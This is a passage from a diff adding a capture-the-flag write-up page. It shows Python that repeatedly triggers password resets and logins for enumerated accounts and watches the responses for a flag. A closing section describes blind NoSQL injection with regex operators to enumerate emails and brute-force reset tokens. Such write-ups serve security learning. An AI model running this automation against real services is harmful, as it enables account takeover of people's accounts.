+</span></span><span style="display:flex;"><span>        result[<span style="color:#e6db74">&#34;forgot_response_snippet&#34;</span>] <span style="color:#f92672">=</span> forgot_response<span style="color:#f92672">.</span>text[:<span style="color:#ae81ff">200</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        final_login_status: Optional[int] <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>        final_login_json: Optional[Dict[str, Any]] <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Steps 2 &amp; 3: Attempt reset + login cycles</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> attempt <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, MAX_RESET_ATTEMPTS <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>            print(
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[2/3] Resetting password (attempt </span><span style="color:#e6db74">{</span>attempt<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>MAX_RESET_ATTEMPTS<span style="color:#e6db74">}</span><span style="color:#e6db74">)...&#34;</span>
+</span></span><span style="display:flex;"><span>            )
+</span></span><span style="display:flex;"><span>            reset_response <span style="color:#f92672">=</span> request_reset()
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Response Status: </span><span style="color:#e6db74">{</span>reset_response<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            reset_text <span style="color:#f92672">=</span> reset_response<span style="color:#f92672">.</span>text[:<span style="color:#ae81ff">200</span>]
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Response: </span><span style="color:#e6db74">{</span>reset_text<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;flag&#34;</span> <span style="color:#f92672">in</span> reset_response<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>lower():
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#34;Flag detected in reset response!&#34;</span>)
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Response: </span><span style="color:#e6db74">{</span>reset_response<span style="color:#f92672">.</span>text<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[3/3] Attempting login with email and password...&#34;</span>)
+</span></span><span style="display:flex;"><span>            login_response <span style="color:#f92672">=</span> request_login(email, PASSWORD)
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Response Status: </span><span style="color:#e6db74">{</span>login_response<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Response: </span><span style="color:#e6db74">{</span>login_response<span style="color:#f92672">.</span>text[:<span style="color:#ae81ff">200</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                login_json <span style="color:#f92672">=</span> login_response<span style="color:#f92672">.</span>json()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>                login_json <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;raw&#34;</span>: login_response<span style="color:#f92672">.</span>text[:<span style="color:#ae81ff">200</span>],
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;status_code&#34;</span>: login_response<span style="color:#f92672">.</span>status_code,
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            result[<span style="color:#e6db74">&#34;attempts&#34;</span>]<span style="color:#f92672">.</span>append(
+</span></span><span style="display:flex;"><span>                {
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;attempt&#34;</span>: attempt,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;reset_status&#34;</span>: reset_response<span style="color:#f92672">.</span>status_code,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;reset_response_snippet&#34;</span>: reset_text,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;login_status&#34;</span>: login_response<span style="color:#f92672">.</span>status_code,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;login_response&#34;</span>: login_json,
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> login_response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>                final_login_status <span style="color:#f92672">=</span> login_response<span style="color:#f92672">.</span>status_code
+</span></span><span style="display:flex;"><span>                final_login_json <span style="color:#f92672">=</span> login_json
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#34;Login succeeded after reset.&#34;</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> final_login_status <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Capture last login response even if failure</span>
+</span></span><span style="display:flex;"><span>            final_login_status <span style="color:#f92672">=</span> (
+</span></span><span style="display:flex;"><span>                result[<span style="color:#e6db74">&#34;attempts&#34;</span>][<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>][<span style="color:#e6db74">&#34;login_status&#34;</span>] <span style="color:#66d9ef">if</span> result[<span style="color:#e6db74">&#34;attempts&#34;</span>] <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>            )
+</span></span><span style="display:flex;"><span>            final_login_json <span style="color:#f92672">=</span> (
+</span></span><span style="display:flex;"><span>                result[<span style="color:#e6db74">&#34;attempts&#34;</span>][<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>][<span style="color:#e6db74">&#34;login_response&#34;</span>] <span style="color:#66d9ef">if</span> result[<span style="color:#e6db74">&#34;attempts&#34;</span>] <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>            )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        result[<span style="color:#e6db74">&#34;status_code&#34;</span>] <span style="color:#f92672">=</span> final_login_status
+</span></span><span style="display:flex;"><span>        result[<span style="color:#e6db74">&#34;response&#34;</span>] <span style="color:#f92672">=</span> final_login_json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error processing </span><span style="color:#e6db74">{</span>email<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        result[<span style="color:#e6db74">&#34;error&#34;</span>] <span style="color:#f92672">=</span> str(e)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    login_results<span style="color:#f92672">.</span>append(result)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>json_text <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>dumps(login_results, indent<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">{</span><span style="color:#e6db74">&#39;=&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">60</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;FINAL LOGIN RESULTS (JSON):&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;=&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">60</span>)
+</span></span><span style="display:flex;"><span>print(json_text)
+</span></span><span style="display:flex;"><span>Path(<span style="color:#e6db74">&#34;login_results.json&#34;</span>)<span style="color:#f92672">.</span>write_text(json_text)
+</span></span></code></pre></div><h2 id="5-conclusion">5. Conclusion</h2>
+<p>The challenge demonstrated classic NoSQL injection techniques, leveraging regex operators to enumerate user emails and reset passwords. While the exploitation process was straightforward, it required careful automation to handle the brute-force nature of the reset token guessing. The provided scripts effectively automated the enumeration and exploitation steps, ultimately leading to the successful retrieval of the flag.</p>
+<p>I personally did not enjoy the challenge due to the extensive brute forcing and waiting times involved, which detracted from the overall experience. However, it served as a practical exercise in bling-NoSQL injection techniques and automation strategies.</p>
+<p>PS: There might be different way to solve the challenge, this the only way i found that produced results.</p>
+
+</content>
+
+
+
+<p>
+  
+</p>
+
+  </main>
+  <footer></footer>
+
+  
+</body>
+
+</html>
